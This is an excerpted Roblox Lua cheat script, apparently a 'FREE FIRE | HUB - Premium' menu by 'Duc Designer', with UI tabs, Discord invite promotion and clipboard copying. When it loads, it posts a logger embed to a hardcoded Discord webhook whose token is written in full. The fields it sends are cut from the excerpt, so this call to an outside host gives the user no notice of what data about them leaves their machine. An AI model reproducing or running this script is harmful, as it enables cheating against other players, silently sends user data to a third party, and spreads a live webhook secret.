...
function AdminLoggerMsg()
    ...
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Check Script by Duc Designer**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor,
                ["fields"] = {
...
PostWebhook(
    "https://discord.com/api/webhooks/1283638463672881172/rkb5uugZDQvLOL4epJSI51zf1VXLPcvdh4daCm0PzcFrZ7bsYVeYKuF9hhbCheLGet2R",
    AdminLoggerMsg()
)
print("Dell load")
print(" Join Team ")
...
L2.Draggable = true
sound.Parent = L2
sound.SoundId = "rbxassetid://127393374937080"
...
TextLabel.Text = "discord.gg/34NAAGn3vH"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
...
local Window = Fluent:CreateWindow({
    Title = "FREE FIRE | HUB - Premium",
    SubTitle = " By Duc • Designer",
    TabWidth = 140,
...
local Tabs = {
    ...
    St = Window:AddTab({ Title = "Tab Status & Server", Icon = "" }),    
    Lc = Window:AddTab({ Title = "Tab Travel-Map", Icon = "" }),  
...
Tabs.support:AddButton({
        ...
        Callback = function()            
        setclipboard("https://discord.gg/34NAAGn3vH") 
      end
    })
...
print("load xong r") 
print("Developer: Duc Designer kẻ thống trị hệ thống roblox")
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
game.StarterGui:SetCore("SendNotification", {
Title = "FREEFIRE",
Text = "Successfully",
